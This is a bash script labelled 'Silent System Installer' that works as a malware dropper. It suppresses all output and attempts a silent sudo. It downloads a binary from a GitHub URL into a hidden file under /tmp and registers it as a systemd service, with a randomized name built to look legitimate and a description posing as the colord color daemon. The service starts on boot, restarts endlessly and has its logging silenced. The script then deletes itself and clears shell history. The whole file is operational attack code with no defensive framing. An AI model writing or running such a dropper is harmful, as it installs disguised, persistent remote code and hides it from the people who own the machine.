#!/bin/bash
#
# Silent System Installer
# No output, completely silent operation
#

# Redirect all output to /dev/null
exec 1>/dev/null 2>&1

# Configuration
GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"

# Generate random service name (looks like legit systemd service)
gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=("colord" "upower" "helper-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
    
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}

SERVICE_NAME=$(gen_service_name)
INSTALL_DIR="/tmp/${SERVICE_NAME}"
BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Escalate to root if needed
[ "$EUID" -ne 0 ] && exec sudo -n bash "$0" "$@" 2>/dev/null

# Create installation directory
mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 1
cd "$INSTALL_DIR" || exit 1

# Download binary (silent)
if command -v curl >/dev/null 2>&1; then
    curl -sSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
else
    exit 1
fi

# Verify download
[ -f "$BINARY_NAME" ] || exit 1
[ -s "$BINARY_NAME" ] || exit 1

# Make executable
chmod +x "$BINARY_NAME" 2>/dev/null

# Create systemd service
cat > "$SERVICE_FILE" << 'SVCEOF'
[Unit]
Description=System Color Management Daemon
Documentation=man:colord(1)
After=network.target network-online.target systemd-udevd.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=0
StartLimitBurst=999

# Process settings
Nice=-5
OOMScoreAdjust=-500
CPUQuota=15%
MemoryMax=150M

# Security (but allow network)
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=read-only
NoNewPrivileges=false
ReadWritePaths=/tmp /var/tmp

# Logging (silence all)
StandardOutput=null
StandardError=null
SyslogIdentifier=colord

# Environment
Environment=HOME=/root
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WorkingDirectory=INSTALL_DIR_PLACEHOLDER

# Auto-restart settings
SuccessExitStatus=0 1 143
RestartPreventExitStatus=
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
SVCEOF

# Replace placeholders
sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"

# Reload and start service
systemctl daemon-reload 2>/dev/null
systemctl enable "$SERVICE_NAME" 2>/dev/null
systemctl start "$SERVICE_NAME" 2>/dev/null

# Verify service started
sleep 3
systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null

# Self-destruct installer
if [ $? -eq 0 ]; then
    # Service running - remove installer traces
    rm -f "$0" 2>/dev/null &
    history -c 2>/dev/null
    exit 0
else
    # Failed - cleanup
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -rf "$INSTALL_DIR" 2>/dev/null
    rm -f "$0" 2>/dev/null &
    exit 1
fi
